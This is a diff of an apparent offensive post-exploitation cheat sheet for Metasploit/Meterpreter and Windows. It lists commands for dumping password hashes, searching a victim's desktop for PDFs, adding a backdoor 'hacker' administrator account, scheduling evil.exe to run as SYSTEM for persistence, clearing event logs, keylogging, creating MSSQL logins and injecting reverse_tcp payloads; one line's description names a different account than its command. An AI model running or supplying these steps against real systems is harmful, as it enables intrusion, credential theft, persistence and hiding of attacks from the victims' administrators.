@@ -221,6 +221,8 @@ screenshot                                    Take a photo of the desktop.
 
 hashdump                                      Dump password hashes.
 
+search -d c:\\documents\ and\ settings\\<user>\\desktop\\ -f *.pdf
+
 ipconfig                                      Look for dual-homed connections.
 autoroute -s <new CIDR range>                 If dual-homed.
 autoroute -p                                  Print routing table.
@@ -304,7 +306,7 @@ net user                                      Show user accounts.
 net accounts                                  Show password policies.
 net user hacker password /add                 Add a new account called ciphent with the password ciphent.
 net localgroup Administrators hacker /add     Add the new account to the Administrators security group.
-net localgroup administrators
+net localgroup Administrators
 ipconfig
 [take screen shot]
 exit
@@ -433,20 +435,6 @@ at 19:00 /every:M,T,W,Th,F cmd /c start "%USERPROFILE%\evil.exe"
 SCHTASKS /Create /RU "SYSTEM" /SC MINUTE /MO 45 /TN FIREWALL /TR "%USERPROFILE%\evil.exe"  /ED 11/11/2011
 ==========
 
-getsystem
-getuid
-rev2self
-getuid
-ps		                   Look for process ID that NT/Authority is running (example: Explorer)
-migrate <PID of Explorer>
-getpid
-clearev
-getdesktop
-keyscan_start		(Wait several minutes)
-keyscan_dump
-keyscan_stop
-==========
-
 set options "InitialAutoRunScript=migrate -f", "AutoRunScript=post/multi/gather/run_console_rc_file RESOURCE=/opt/scripts/resource/post.rc
 ==========
 
@@ -454,8 +442,6 @@ auxiliary(mssql_sql) > set sql EXEC sp_addlogin hacker, password;EXEC master.dbo
 run
 ==========
 
-getgui will not work on Windows 2000 Server. Instead try:
-set PAYLOAD windows/vncinject/reverse_tcp
+getgui will not work on Windows 2000 Server. Instead try: set PAYLOAD windows/vncinject/reverse_tcp
 
-For injecting into memory:
-use exploit/windows/local/payload_inject
+For injecting into memory: use exploit/windows/local/payload_inject
